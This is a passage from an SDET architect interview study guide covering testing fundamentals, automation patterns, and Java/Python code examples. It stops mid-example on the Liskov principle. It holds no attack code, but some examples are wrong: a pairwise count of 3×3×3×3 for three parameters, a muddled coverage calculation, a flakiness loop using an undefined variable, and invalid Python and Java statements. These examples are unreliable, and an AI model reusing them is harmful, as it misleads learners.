
## Core Testing & QA Fundamentals
- Test pyramid (unit, integration, E2E ratio optimization)
- Test types: functional, non-functional, smoke, sanity, regression
- Black-box, white-box, and gray-box testing
- Boundary value analysis and equivalence partitioning
- State transition testing and decision table testing
- Exploratory testing and test case design techniques
- Test coverage metrics (code coverage, branch coverage, path coverage)
- Mutation testing concepts
- Risk-based testing prioritization
- Shift-left testing strategy
- Testing in production and canary testing

## Test Automation Architecture
- Page Object Model (POM) pattern and variations
- Screenplay/Actor pattern
- Data-driven testing frameworks
- Keyword-driven testing
- Behavior-driven development (BDD) implementation
- Keyword-action-data (KAD) framework design
- Modular test framework design
- Object repository management
- Test configuration management
- Parameterization and data sources
- Custom test frameworks vs. off-the-shelf solutions
- Parallel test execution architecture
- Test dependency and test sequence management
- Flakey test detection and remediation
- Test isolation principles
- Test cleanup and teardown strategies
- Custom assertions and matchers
- Test reporting framework design (HTML, JSON, XML reports)

## Programming Languages & Advanced Concepts
- Java: Streams, Collections, Generics, Reflection, Annotations
- Python: Decorators, Generators, Context managers, OOP
- C#/.NET: LINQ, async-await, attributes
- JavaScript/TypeScript: Promises, async-await, closures, prototypes
- Design patterns: Singleton, Factory, Builder, Observer, Strategy, Decorator
- SOLID principles (SRP, OCP, LSP, ISP, DIP)
- DRY, KISS, YAGNI principles
- Refactoring techniques and code smell identification
- Dependency injection and IoC containers
- Mocking and stubbing frameworks (Mockito, Moq, Jest)
- Unit testing best practices
- Integration testing approaches
- Test-driven development (TDD) and ATDD

## Web Automation & Selenium Ecosystem
- Selenium WebDriver architecture
- Locator strategies (XPath, CSS selectors optimization)
- Implicit vs. explicit vs. fluent waits
- Handling dynamic elements and AJAX
- Window/tab handling
- Alert handling
- Frame and iframe handling
- Shadow DOM handling
- Stale element reference handling
- Actions class (keyboard, mouse interactions)
- JavaScript execution within tests
- Chrome DevTools Protocol integration
- Selenium Grid setup and management
- Parallel execution with Selenium Grid
- Headless browser testing
- Cross-browser compatibility testing
- Browser capability and options management
- Driver management patterns (ThreadLocal, Singleton)

## Modern Web Automation Alternatives
- Cypress fundamentals and architecture
- Cypress vs. Selenium comparison
- Playwright advantages and implementation
- Puppeteer for headless Chrome automation
- WebdriverIO architecture
- Native vs. cross-platform browser testing
- Visual regression testing tools (Percy, Applitools)
- Performance testing integration with automation

## Mobile Automation
- Appium architecture and capabilities
- Native, hybrid, and web app testing
- Android automation (UIAutomator, Espresso)
- iOS automation (XCUITest, EarlGrey)
- Cross-platform mobile strategies
- Device farm management (BrowserStack, Sauce Labs)
- Mobile gesture automation (swipe, tap, long-press)
- App-specific capabilities and configurations
- Performance testing for mobile apps
- Battery and memory testing

## API Testing & Integration Testing
- REST API testing strategies
- SOAP and GraphQL testing
- HTTP methods and status codes
- Request-response validation
- Header validation and authentication
- RestAssured (Java) implementation
- Postman and Newman CLI automation
- REST client libraries (requests, axios, HttpClient)
- API contract testing
- OpenAPI/Swagger specification testing
- API rate limiting and throttling testing
- Webhook testing
- API versioning testing strategies
- Backward compatibility testing
- API security testing (authentication, authorization)
- API documentation validation
- Schema validation (JSON Schema, XSD)
- Microservices testing approach

## BDD & Gherkin
- Gherkin syntax and best practices
- Cucumber architecture and step definitions
- Feature file organization
- Scenario outline and data tables
- Hook implementation (Before, After, BeforeStep, AfterStep)
- World objects and context management
- Step reusability and maintenance
- BDD test report generation
- Cucumber with Java/Python/JavaScript
- SpecFlow (.NET) implementation
- Behave (Python) framework
- BDD metrics and analytics

## Database Testing
- SQL fundamentals and query optimization
- Database connection pooling
- Transaction and ACID properties testing
- Stored procedure testing
- Trigger testing
- Index performance testing
- Data integrity and consistency validation
- ETL (Extract, Transform, Load) testing
- Data warehousing concepts
- NoSQL databases (MongoDB, Cassandra, Redis)
- Data migration testing
- Database backup and recovery testing
- Query result validation
- Database versioning and schema changes
- ORM (Object-Relational Mapping) testing

## Performance & Load Testing
- Performance testing terminology (latency, throughput, response time)
- Load testing vs. stress testing vs. soak testing
- JMeter fundamentals and scripting
- LoadRunner architecture
- Gatling performance testing
- Apache Bench and other tools
- Response time analysis and SLA definition
- Throughput measurement and optimization
- Concurrent user modeling
- Ramp-up and ramp-down strategies
- Spike testing and volume testing
- Baseline establishment
- Performance bottleneck identification
- Memory leak detection
- Database performance testing
- Network simulation and throttling
- Performance reporting and analysis
- APM (Application Performance Monitoring) integration

## CI/CD & DevOps Integration
- Jenkins pipeline architecture (Declarative and Scripted)
- GitHub Actions workflow creation
- GitLab CI/CD configuration
- Azure DevOps pipeline setup
- CircleCI and Travis CI
- Build triggers and webhooks
- Artifact management and versioning
- Docker containerization for test environments
- Docker Compose for multi-container setups
- Kubernetes basics and test orchestration
- Infrastructure as Code (Terraform, CloudFormation)
- Configuration management (Ansible, Chef, Puppet)
- Environment provisioning automation
- Test environment teardown and cleanup
- Fail-fast principles in pipelines
- Test result aggregation and reporting
- Notifications and alerting
- Pipeline performance optimization

## Cloud Platforms
- AWS: EC2, S3, Lambda, RDS, CloudWatch
- Google Cloud: Compute Engine, Cloud Storage, Cloud Functions
- Azure: Virtual Machines, App Service, Azure DevOps
- Cloud-based test execution
- Serverless testing approach
- Container orchestration in cloud
- Cost optimization for test automation

## Test Data Management
- Test data strategy and planning
- Synthetic data generation
- Data masking and anonymization
- Test data versioning
- Database snapshots and restoration
- Test data factories and builders
- Fixture management
- Test data cleanup strategies
- Production data handling (GDPR, privacy)
- Data subsetting and extraction
- Mock data generation libraries
- Test data as Code approach

## Test Reporting & Metrics
- Test execution reports (HTML, PDF, JSON)
- Allure framework implementation
- Extent Reports setup and customization
- Custom report generation
- Test dashboard creation
- Metrics: pass rate, execution time, flakiness rate
- Trend analysis and reporting
- Test coverage visualization
- Defect metrics and tracking
- Test automation ROI calculation
- SLA compliance monitoring
- Real-time reporting and notifications
- Report integration with CI/CD

## Logging & Debugging
- Logging frameworks (Log4j, Serilog, Winston)
- Log levels and log management
- Remote logging and centralized logging
- ELK Stack (Elasticsearch, Logstash, Kibana)
- Splunk and other SIEM tools
- Stack trace analysis
- Debugging techniques and tools
- Browser DevTools usage
- Network monitoring (Charles, Fiddler)
- HAR file analysis
- Remote debugging
- Thread dump analysis

## Security Testing
- OWASP Top 10 vulnerabilities
- SQL injection testing
- XSS (Cross-Site Scripting) testing
- CSRF (Cross-Site Request Forgery) testing
- Authentication and authorization testing
- API security testing
- SSL/TLS certificate validation
- Encryption and decryption testing
- Secure coding practices
- Dependency vulnerability scanning (OWASP Dependency-Check, Snyk)
- SAST (Static Application Security Testing)
- DAST (Dynamic Application Security Testing)
- Penetration testing basics
- Security compliance testing (PCI-DSS, HIPAA)
- Data privacy testing (GDPR, CCPA)

## Advanced Test Concepts
- Visual testing and image comparison
- Accessibility testing (WCAG, ADA compliance)
- Cross-browser testing strategies
- Internationalization (i18n) and localization (l10n) testing
- RTL (Right-to-Left) language testing
- Mobile and responsive design testing
- Progressive Web App (PWA) testing
- Electron app testing
- Desktop application automation
- SAP and enterprise application testing
- Legacy system testing
- Monolithic vs. microservices testing approach
- Contract testing in microservices
- Consumer-driven contract testing
- Chaos engineering and resilience testing

## Architecture & Design Patterns
- Test architecture scalability
- Framework extensibility and maintainability
- Plugin architecture for test frameworks
- Event-driven testing architecture
- Service virtualization and mocking
- Test environment architecture
- Containerized test environment design
- Multi-tenant testing strategy
- Distributed testing architecture
- Test result federation and consolidation

## Version Control & Collaboration
- Git branching strategies (Git Flow, GitHub Flow, trunk-based)
- Pull request reviews and code quality gates
- Semantic versioning
- Changelog management
- Tag management and release notes
- Merge conflict resolution
- Collaborative testing and pair testing
- Code review best practices
- Test case versioning

## Leadership & Soft Skills
- Team structure design (pyramid vs. flat)
- Mentoring and knowledge transfer
- Hiring and interviewing SDET candidates
- Tool and vendor evaluation
- Cost-benefit analysis of automation
- Test automation roadmap creation
- Change management and adoption
- Stakeholder communication and expectation setting
- Executive reporting and dashboards
- Agile ceremonies (Sprint planning, Retro, Standups)
- Process improvement and continuous optimization
- Risk management and mitigation strategies
- Handling test failures and flakiness reports
- Balancing manual and automation testing
- Technical debt assessment and prioritization
- Documentation standards and Wiki management

## Tool & Vendor Management
- Tool selection criteria
- Open-source vs. commercial tools
- License management and compliance
- Tool maintenance and upgrade strategy
- Third-party integrations and APIs
- Custom vs. built-in reporting
- Vendor support and SLAs
- Tool scalability and performance
- Migration strategies between tools

## Trending Technologies & Concepts
- AI/ML in test automation
- Intelligent test selection and prioritization
- Codeless automation tools (Playwright Codegen, Selenium IDE)
- No-code/low-code testing platforms
- Cloud-native testing
- Test orchestration platforms
- Observability-driven testing
- Shift-left and shift-right testing
- Continuous testing vs. continuous delivery
- Test mesh architecture
- Autonomous testing concepts
- Edge testing and IoT testing
- Blockchain testing basics

## Soft Technical Skills
- System thinking and holistic approach
- Trade-off analysis (speed vs. reliability, cost vs. coverage)
- Quick learning and adaptability
- Problem-solving and troubleshooting methodology
- Documentation and technical writing
- Presentation skills
- Influencing without authority
- Conflict resolution
- Time management and prioritization
- Mentorship and coaching




# SDET Architect Interview Guide - 10 Years Experience
## Exhaustive Study Material

---

## TABLE OF CONTENTS
1. Core Testing & QA Fundamentals
2. Test Automation Architecture & Patterns
3. Programming Languages & Advanced Concepts
4. Web Automation & Selenium Ecosystem
5. Mobile Automation
6. API Testing & Integration Testing
7. BDD & Gherkin
8. Database Testing
9. Performance & Load Testing
10. CI/CD & DevOps Integration
11. Cloud Platforms
12. Test Data Management
13. Test Reporting & Metrics
14. Logging & Debugging
15. Security Testing
16. Advanced Test Concepts
17. Version Control & Collaboration
18. Leadership & Soft Skills

---

# 1. CORE TESTING & QA FUNDAMENTALS

## 1.1 Test Pyramid

**What It Is:**
The test pyramid is a framework that suggests the distribution of tests across different levels. At the bottom are unit tests (many, fast), in the middle are integration tests (moderate), and at the top are E2E tests (few, slow).

**Ratio:**
- Unit Tests: 60-70%
- Integration Tests: 20-30%
- E2E Tests: 5-15%

**Why This Distribution:**
- Unit tests are cheap, fast, and provide quick feedback
- Integration tests verify component interactions
- E2E tests ensure business flows work but are expensive to maintain

**Interview Questions:**
- "Why should we have more unit tests than E2E tests?"
- "How do you balance E2E vs integration tests in a microservices architecture?"
- "What happens if you invert the pyramid?"

**Professional Answer:**
A pyramid inversion (many E2E tests, few unit tests) leads to slow builds, high maintenance costs, and brittle tests. As an SDET architect, you'd advocate for the proper pyramid to reduce build times from hours to minutes and reduce test maintenance costs.

---

## 1.2 Test Types

### Functional Testing
- Verifies that features work as specified
- Tests inputs and outputs
- Example: "When user enters valid email, account is created"

### Non-Functional Testing
Includes:
- **Performance Testing:** Response time, throughput
- **Load Testing:** Behavior under expected load
- **Stress Testing:** Behavior under extreme load
- **Soak Testing:** Stability over extended periods
- **Security Testing:** Vulnerability detection
- **Usability Testing:** User experience
- **Accessibility Testing:** WCAG compliance

### Smoke Testing
- Quick sanity check before full test suite
- Verifies basic functionality
- Usually first step in pipeline
- Should run in < 5 minutes

### Sanity Testing
- Narrow focused testing
- Verifies specific functionality after code changes
- Subset of regression testing

### Regression Testing
- Ensures new changes don't break existing functionality
- Can be automated or manual
- Most important for automation investment

---

## 1.3 Test Design Techniques

### Boundary Value Analysis
Tests values at the edges of input domains.

Example:
- Field accepts 1-100
- Test: 0 (below), 1 (boundary), 50 (valid), 100 (boundary), 101 (above)

**Why Important:** Most bugs occur at boundaries

### Equivalence Partitioning
Divide inputs into groups where all values behave similarly.

Example:
- Age field: negative (invalid), 0-17 (child), 18-65 (adult), 65+ (senior)
- Test one value from each partition

### Decision Table Testing
Tests all combinations of conditions and their outcomes.

Example:
```
User Role | Has Permission | Feature Enabled | Result
Admin     | Yes            | Yes             | Access
User      | Yes            | Yes             | Access
User      | No             | Yes             | No Access
User      | Yes            | No              | No Access
```

### State Transition Testing
Tests state changes in systems.

Example (Order Processing):
```
New → Pending → Shipped → Delivered
  ↑                           ↓
  └───────── Cancelled ───────┘
```

### Pairwise Testing
Tests combinations of parameters without testing all combinations.
- Reduces test cases significantly
- Covers most critical interactions
- Tool: PICT

**Example Scenario:**
- Browser: Chrome, Firefox, Safari
- OS: Windows, Mac, Linux
- Resolution: 1920x1080, 1366x768, 768x1024
- All combinations = 3×3×3×3 = 81 tests
- Pairwise = ~20 tests covering all pairs

---

## 1.4 Test Coverage Metrics

### Code Coverage (Line Coverage)
- Percentage of code lines executed
- Formula: (Lines executed / Total lines) × 100
- **Limitation:** High coverage ≠ high quality

Example:
```python
def process_payment(amount, card):
    if amount <= 0:
        return False
    if not card.is_valid():
        return False
    charge(card, amount)
    return True
```
- 3 lines → 6 lines in function = 50% coverage minimum
- But you need tests for each condition

### Branch Coverage
- Percentage of decision branches tested
- Example: if-else, switch statements
- More thorough than line coverage

### Path Coverage
- Tests all possible execution paths
- Exponential with number of decisions
- Impractical for complex code

**Industry Standards:**
- 70%+ is good
- 80%+ is excellent
- 90%+ is often over-testing (diminishing returns)

---

## 1.5 Mutation Testing

**What It Is:**
Intentionally inject bugs (mutations) into code and verify tests catch them.

**Example:**
Original:
```python
if age >= 18:
    can_vote = True
```

Mutation 1: Change >= to >
Mutation 2: Change >= to <=

**Good tests catch both mutations (high mutation score)**

**Mutation Score:**
= (Mutations killed by tests / Total mutations) × 100

**Tools:**
- Pitest (Java)
- Mutmut (Python)
- Stryker (JavaScript)

**Why It Matters:**
- Identifies weak tests
- Shows test quality beyond code coverage
- Guides test improvement

---

## 1.6 Risk-Based Testing

**Concept:**
Prioritize tests based on risk (impact × probability).

**High-Risk Areas:**
- Payment processing
- Authentication/Authorization
- Data deletion
- Third-party integrations

**Risk Assessment Matrix:**
```
          Probability
          Low  Medium  High
Impact
High      M    H      H
Medium    L    M      H
Low       L    L      M
```

**Example Prioritization:**
1. Critical business flows (highest risk)
2. Payment processing
3. User management
4. Reports
5. UI cosmetics (lowest risk)

---

## 1.7 Shift-Left Testing

**Concept:**
Move testing earlier in development cycle.

**Traditional (Shift-Right):**
Development → Testing → Production

**Shift-Left Approach:**
Testing → Development → Testing → Production

**Implementation:**
- Unit tests during development
- Code review with QA
- Integration tests as features are built
- Performance testing in development

**Benefits:**
- Bugs caught early (cheaper to fix)
- Faster feedback loop
- Better code quality
- Developers think about testability

---

## 1.8 Testing in Production

**Controlled Approaches:**
- **Canary Deployment:** 5% users see new version
- **Feature Flags:** Test with subset of users
- **A/B Testing:** Compare versions
- **Shadow Testing:** Run new code alongside old

**Monitoring:**
- Error rates
- Response times
- User behavior
- Resource usage

**Automated Checks:**
- Health checks
- API contracts
- Critical business flows
- Data consistency

---

# 2. TEST AUTOMATION ARCHITECTURE & PATTERNS

## 2.1 Page Object Model (POM)

**What It Is:**
An object-oriented approach where each page/screen is a class with methods and elements.

**Without POM:**
```python
driver.find_element(By.ID, "email-input").send_keys("user@test.com")
driver.find_element(By.ID, "password-input").send_keys("pass123")
driver.find_element(By.XPATH, "//button[@type='submit']").click()
```

**With POM:**
```python
from pages.login_page import LoginPage

page = LoginPage(driver)
page.login("user@test.com", "pass123")
```

**LoginPage Class:**
```python
class LoginPage:
    EMAIL_INPUT = (By.ID, "email-input")
    PASSWORD_INPUT = (By.ID, "password-input")
    LOGIN_BUTTON = (By.XPATH, "//button[@type='submit']")
    
    def __init__(self, driver):
        self.driver = driver
    
    def login(self, email, password):
        self.driver.find_element(*self.EMAIL_INPUT).send_keys(email)
        self.driver.find_element(*self.PASSWORD_INPUT).send_keys(password)
        self.driver.find_element(*self.LOGIN_BUTTON).click()
```

**Benefits:**
- Reduced code duplication
- Easier maintenance (locator changes in one place)
- Better readability
- Easier for QA to write tests
- Scalable

**Best Practices:**
1. One class per page/section
2. Methods represent user actions (not click/fill)
3. Locators as class variables
4. Return page objects for chaining
5. Never use assertions in page objects

---

## 2.2 Screenplay/Actor Pattern

**What It Is:**
Advanced pattern where actors (users) perform tasks and interactions.

**Structure:**
- **Actors:** Users with abilities
- **Abilities:** What actors can do (interact with UI, API, database)
- **Interactions:** Low-level actions (click, type, navigate)
- **Tasks:** Higher-level business actions
- **Questions:** Query the system

**Example:**
```java
actor.attemptsTo(
    Open.theBrowserOn(HomePage.class),
    Fill.in(LoginForm.EMAIL_INPUT).with("user@test.com"),
    Fill.in(LoginForm.PASSWORD_INPUT).with("password"),
    Click.on(LoginForm.LOGIN_BUTTON),
    Verify.that(HomePage.WELCOME_MESSAGE).isDisplayed()
);
```

**Advantages Over POM:**
- More readable (natural language)
- Better separation of concerns
- Abilities can be reused across tests
- Easier to add new interactions
- Framework: Serenity

---

## 2.3 Data-Driven Testing

**Concept:**
Run same test with different data sets.

**Without Data-Driven:**
```python
def test_login_valid():
    login("user1@test.com", "pass1")
    assert success()

def test_login_invalid():
    login("invalid@test.com", "wrong")
    assert failure()

def test_login_empty():
    login("", "")
    assert failure()
```

**With Data-Driven (Parameterized):**
```python
@pytest.mark.parametrize("email,password,expected", [
    ("user1@test.com", "pass1", True),
    ("invalid@test.com", "wrong", False),
    ("", "", False),
])
def test_login(email, password, expected):
    result = login(email, password)
    assert result == expected
```

**Data Sources:**
- Excel/CSV files
- JSON/XML
- Database
- Test annotations
- API responses

**Benefits:**
- Reduces code duplication
- Easy to add test cases
- Better test coverage
- Easier maintenance

---

## 2.4 Keyword-Driven Testing

**Concept:**
Test cases are written as keyword sequences, often in tables.

**Format:**
```
Keyword       | Argument1           | Argument2
Open Browser  | Chrome              | https://app.com
Login         | user@test.com       | password123
Fill Field    | Product Name Field  | iPhone
Click Button  | Add to Cart         |
Verify Text   | Item added          |
```

**Implementation (Robot Framework):**
```robot
*** Test Cases ***
Add Product to Cart
    Open Browser                ${URL}    Chrome
    Login                       user@test.com    password123
    Fill Field                  Product Name Field    iPhone
    Click Button                Add to Cart
    Page Should Contain         Item added
```

**Advantages:**
- Non-technical people can write tests
- Highly reusable keywords
- Clear test intent
- Centralized keyword library

**Disadvantages:**
- Less flexibility
- Difficult complex logic
- Maintenance overhead
- Limited debugging

---

## 2.5 Object Repository

**What It Is:**
Centralized storage of UI element locators.

**File-Based Approach (properties):**
```properties
# login.properties
login.email.id=email-input
login.password.id=password-input
login.submit.xpath=//button[@type='submit']
```

**Usage in Code:**
```java
public class ObjectRepository {
    Properties props = new Properties();
    
    public ObjectRepository() {
        props.load(new FileInputStream("login.properties"));
    }
    
    public By getLocator(String key) {
        String[] parts = props.getProperty(key).split("::");
        String locatorType = parts[0];
        String locatorValue = parts[1];
        
        return locatorType.equals("id") ? By.id(locatorValue) : By.xpath(locatorValue);
    }
}
```

**Excel-Based Approach:**
```
Page      | Element      | Locator Type | Locator Value
Login     | Email Field  | id           | email-input
Login     | Password     | id           | password-input
Checkout  | Pay Button   | xpath        | //button[@class='pay']
```

**Benefits:**
- Centralized maintenance
- Easy updates
- Supports multiple locators per element
- Better team collaboration

---

## 2.6 Test Dependency & Sequence Management

**Problem:**
Tests often depend on each other, leading to cascading failures.

```python
def test_1_create_user():
    user_id = create_user("John")
    global GLOBAL_USER_ID = user_id

def test_2_login_user():
    login_user(GLOBAL_USER_ID)  # Depends on test_1
```

**Issues:**
- Order-dependent
- If test_1 fails, test_2 is meaningless
- Hard to debug
- Can't run individual tests

**Better Approach:**
```python
@pytest.fixture
def user():
    return create_user("John")

def test_login(user):
    login_user(user)
    assert is_logged_in()
```

**When Dependencies Are Necessary:**
```python
def test_order_workflow(api_client):
    # Create
    response = api_client.post("/users", {"name": "John"})
    user = response.json()
    
    # Login
    assert api_client.login(user["id"]) == True
    
    # Place Order
    order = api_client.post("/orders", {"user_id": user["id"]})
    
    # Verify
    assert order["status"] == "pending"
```

**Best Practice:**
- Use fixtures/setup-teardown
- Avoid test interdependence where possible
- When necessary, keep in single test
- Use tags to group related tests

---

## 2.7 Flakey Test Handling

**What Is Flakiness:**
Test passes sometimes, fails sometimes, without code changes.

**Common Causes:**
1. Timing Issues (race conditions, waits)
2. Environmental Issues (network, external services)
3. Test Data Issues
4. UI Element Changes
5. Concurrency Problems
6. Resource Contention

**Detection:**
```python
# Run test multiple times
for i in range(100):
    result = run_test()
    if results.count(False) > 0:
        print(f"Flakey test detected. Flakiness: {results.count(False)}%")
```

**Tools:**
- Flakiness detection in CI/CD
- Custom reporting
- Test reruns on failure

**Solutions:**

### Timing Issues:
```python
# Bad:
time.sleep(5)  # Hardcoded wait

# Good:
WebDriverWait(driver, 10).until(
    EC.presence_of_element_located((By.ID, "result"))
)
```

### External Service Issues:
```python
# Mock external calls
@mock.patch('requests.get')
def test_user_profile(mock_get):
    mock_get.return_value.json.return_value = {"name": "John"}
    result = get_user_profile(1)
    assert result["name"] == "John"
```

### Test Data Issues:
```python
# Use unique test data
import uuid
unique_email = f"user_{uuid.uuid4()}@test.com"
```

### Concurrent Execution:
```python
# Isolate tests
def test_payment(isolated_environment):
    # Each test gets its own database, cache
    pass
```

---

# 3. PROGRAMMING LANGUAGES & ADVANCED CONCEPTS

## 3.1 Java (For SDET)

### Collections Framework
```java
// List - ordered, allows duplicates
List<String> list = new ArrayList<>();
list.add("selenium");
list.get(0);  // "selenium"

// Set - no duplicates
Set<String> set = new HashSet<>();
set.add("selenium");
set.contains("selenium");  // true

// Map - key-value pairs
Map<String, String> map = new HashMap<>();
map.put("browser", "chrome");
map.get("browser");  // "chrome"

// Queue - FIFO
Queue<String> queue = new LinkedList<>();
queue.offer("first");
queue.poll();  // "first"
```

### Streams & Functional Programming
```java
List<String> tests = Arrays.asList("test1", "test2", "test3");

// Filter
List<String> filtered = tests.stream()
    .filter(t -> t.startsWith("test"))
    .collect(Collectors.toList());

// Map
List<Integer> lengths = tests.stream()
    .map(String::length)
    .collect(Collectors.toList());

// Reduce
String result = tests.stream()
    .reduce("", (a, b) -> a + "," + b);  // "test1,test2,test3"

// Chain operations
Map<Integer, Long> map = tests.stream()
    .collect(Collectors.groupingBy(
        String::length,
        Collectors.counting()
    ));  // {5: 3}
```

### Generics
```java
// Generic class
public class TestData<T> {
    private T data;
    
    public void set(T value) {
        this.data = value;
    }
    
    public T get() {
        return data;
    }
}

// Usage
TestData<String> stringData = new TestData<>();
stringData.set("test");

// Bounded generics
public <T extends WebElement> void fillField(T element, String value) {
    element.sendKeys(value);
}

// Wildcards
List<?> unknownList = new ArrayList<>();
List<? extends WebElement> elements = new ArrayList<>();
List<? super Exception> exceptions = new ArrayList<>();
```

### Reflection
```java
// Get class information
Class<?> clazz = LoginPage.class;
Method[] methods = clazz.getDeclaredMethods();
Field[] fields = clazz.getDeclaredFields();

// Dynamically call methods
Method loginMethod = clazz.getMethod("login", String.class, String.class);
loginMethod.invoke(new LoginPage(driver), "user@test.com", "pass");

// Get annotations
Annotation[] annotations = loginMethod.getAnnotations();

// Use case: Custom test runner
for (Method method : clazz.getDeclaredMethods()) {
    if (method.isAnnotationPresent(Test.class)) {
        method.invoke(new clazz());
    }
}
```

### Annotations
```java
// Custom annotation
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.METHOD)
public @interface SlowTest {
    int timeout() default 30;
    String[] browsers() default {"chrome", "firefox"};
}

// Usage
@SlowTest(timeout = 60, browsers = {"chrome"})
public void testSlowOperation() {
    // Test code
}

// Built-in annotations
@Override  // Compiler checks if overriding parent method
@Deprecated  // Marks as obsolete
@FunctionalInterface  // Interface has single abstract method
@SuppressWarnings("unchecked")  // Suppress compiler warnings
```

---

## 3.2 Python (For SDET)

### Decorators
```python
# Simple decorator
def timer(func):
    def wrapper(*args, **kwargs):
        import time
        start = time.time()
        result = func(*args, **kwargs)
        print(f"Executed in {time.time() - start} seconds")
        return result
    return wrapper

@timer
def slow_test():
    time.sleep(2)

slow_test()  # Executed in 2.001 seconds

# Decorator with arguments
def retry(max_attempts=3):
    def decorator(func):
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt == max_attempts - 1:
                        raise
                    print(f"Attempt {attempt + 1} failed, retrying...")
        return wrapper
    return decorator

@retry(max_attempts=3)
def unstable_operation():
    if random.random() < 0.5:
        raise Exception("Failed")
    return "Success"
```

### Generators & Yield
```python
# Generator (lazy evaluation)
def generate_test_data():
    for i in range(1000000):
        yield {"id": i, "name": f"user_{i}"}

# Memory efficient (doesn't create full list)
for user in generate_test_data():
    print(user)

# Practical example: Data-driven testing
def load_test_cases(file_path):
    with open(file_path) as f:
        for line in f:
            yield line.strip().split(",")

@pytest.mark.parametrize("case", load_test_cases("test_data.csv"))
def test_with_large_dataset(case):
    assert process(case)
```

### Context Managers
```python
# Without context manager
f = open("test.txt")
data = f.read()
f.close()

# With context manager (automatic cleanup)
with open("test.txt") as f:
    data = f.read()
# File automatically closed

# Custom context manager
class DatabaseConnection:
    def __enter__(self):
        self.conn = sqlite3.connect("test.db")
        return self.conn
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.conn.close()

with DatabaseConnection() as conn:
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users")

# Practical for test automation
class BrowserSession:
    def __enter__(self):
        self.driver = webdriver.Chrome()
        return self.driver
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.driver.quit()

with BrowserSession() as driver:
    driver.get("https://example.com")
    # Browser automatically closed
```

### OOP Concepts
```python
# Inheritance
class BasePage:
    def __init__(self, driver):
        self.driver = driver
    
    def find_element(self, locator):
        return self.driver.find_element(*locator)

class LoginPage(BasePage):
    def login(self, email, password):
        self.find_element(self.EMAIL).send_keys(email)

# Polymorphism
class Google(BasePage):
    def search(self, query):
        self.find_element(self.SEARCH_BOX).send_keys(query)

class Bing(BasePage):
    def search(self, query):
        self.find_element(self.SEARCH_INPUT).send_keys(query)

def perform_search(page, query):
    page.search(query)  # Works for both Google and Bing

# Encapsulation (Private methods)
class TestUser:
    def __init__(self, name):
        self._name = name  # Private by convention
    
    def __validate_name(self):  # Name mangled
        if not self._name:
            raise ValueError("Name cannot be empty")
```

---

## 3.3 Design Patterns

### Singleton Pattern
```java
// Ensures only one instance exists
public class WebDriverManager {
    private static WebDriverManager instance;
    private WebDriver driver;
    
    private WebDriverManager() {}  // Private constructor
    
    public static WebDriverManager getInstance() {
        if (instance == null) {
            synchronized(WebDriverManager.class) {
                if (instance == null) {
                    instance = new WebDriverManager();
                    instance.driver = new ChromeDriver();
                }
            }
        }
        return instance;
    }
    
    public WebDriver getDriver() {
        return driver;
    }
}

// Usage
WebDriver driver = WebDriverManager.getInstance().getDriver();
```

**Use Case:** Database connections, logger, configuration

### Factory Pattern
```java
// Creates objects without specifying their classes
public class BrowserFactory {
    public static WebDriver createBrowser(String browserName) {
        switch(browserName.toLowerCase()) {
            case "chrome":
                return new ChromeDriver();
            case "firefox":
                return new FirefoxDriver();
            case "safari":
                return new SafariDriver();
            default:
                throw new IllegalArgumentException("Unknown browser");
        }
    }
}

// Usage
WebDriver driver = BrowserFactory.createBrowser("chrome");
```

### Builder Pattern
```java
// Constructs complex objects step by step
public class TestUserBuilder {
    private String name;
    private String email;
    private String password;
    private boolean isActive = true;
    
    public TestUserBuilder withName(String name) {
        this.name = name;
        return this;
    }
    
    public TestUserBuilder withEmail(String email) {
        this.email = email;
        return this;
    }
    
    public TestUserBuilder withPassword(String password) {
        this.password = password;
        return this;
    }
    
    public TestUserBuilder inactive() {
        this.isActive = false;
        return this;
    }
    
    public User build() {
        return new User(name, email, password, isActive);
    }
}

// Usage
User user = new TestUserBuilder()
    .withName("John")
    .withEmail("john@test.com")
    .withPassword("secure123")
    .build();
```

### Observer Pattern
```java
// Objects notify others of state changes
public class TestResult {
    private List<TestListener> listeners = new ArrayList<>();
    
    public void addListener(TestListener listener) {
        listeners.add(listener);
    }
    
    public void notifyListeners(String result) {
        for (TestListener listener : listeners) {
            listener.onTestComplete(result);
        }
    }
}

public interface TestListener {
    void onTestComplete(String result);
}

public class ReportListener implements TestListener {
    @Override
    public void onTestComplete(String result) {
        System.out.println("Recording result: " + result);
    }
}

// Usage
TestResult result = new TestResult();
result.addListener(new ReportListener());
result.notifyListeners("PASSED");
```

### Strategy Pattern
```java
// Encapsulates algorithms to make them interchangeable
public interface WaitStrategy {
    void wait(WebDriver driver, By locator);
}

public class ImplicitWait implements WaitStrategy {
    @Override
    public void wait(WebDriver driver, By locator) {
        driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);
    }
}

public class ExplicitWait implements WaitStrategy {
    @Override
    public void wait(WebDriver driver, By locator) {
        new WebDriverWait(driver, 10).until(
            ExpectedConditions.presenceOfElementLocated(locator)
        );
    }
}

public class Element {
    private WaitStrategy waitStrategy;
    
    public Element(WaitStrategy waitStrategy) {
        this.waitStrategy = waitStrategy;
    }
    
    public void click(WebDriver driver, By locator) {
        waitStrategy.wait(driver, locator);
        driver.findElement(locator).click();
    }
}
```

---

## 3.4 SOLID Principles

### Single Responsibility Principle
```java
// Bad - class does too much
public class User {
    public void create() { }
    public void delete() { }
    public void sendEmail() { }
    public void generateReport() { }
}

// Good - each class has one responsibility
public class UserRepository {
    public void create(User user) { }
    public void delete(User user) { }
}

public class EmailService {
    public void send(String to, String message) { }
}

public class ReportGenerator {
    public void generate(User user) { }
}
```

### Open/Closed Principle
```java
// Bad - needs modification for new browser
public class BrowserFactory {
    public WebDriver create(String type) {
        if (type.equals("chrome")) return new ChromeDriver();
        if (type.equals("firefox")) return new FirefoxDriver();
        // Must modify when adding Safari
    }
}

// Good - open for extension, closed for modification
public interface BrowserFactory {
    WebDriver create();
}

public class ChromeFactory implements BrowserFactory {
    public WebDriver create() { return new ChromeDriver(); }
}

public class FirefoxFactory implements BrowserFactory {
    public WebDriver create() { return new FirefoxDriver(); }
}

// Can add new browser without modifying existing code
```

### Liskov Substitution Principle
```java
// Bad - violates LSP
public class Bird {
    public void fly() { }
}

public class Penguin extends Bird {
    public void fly() {
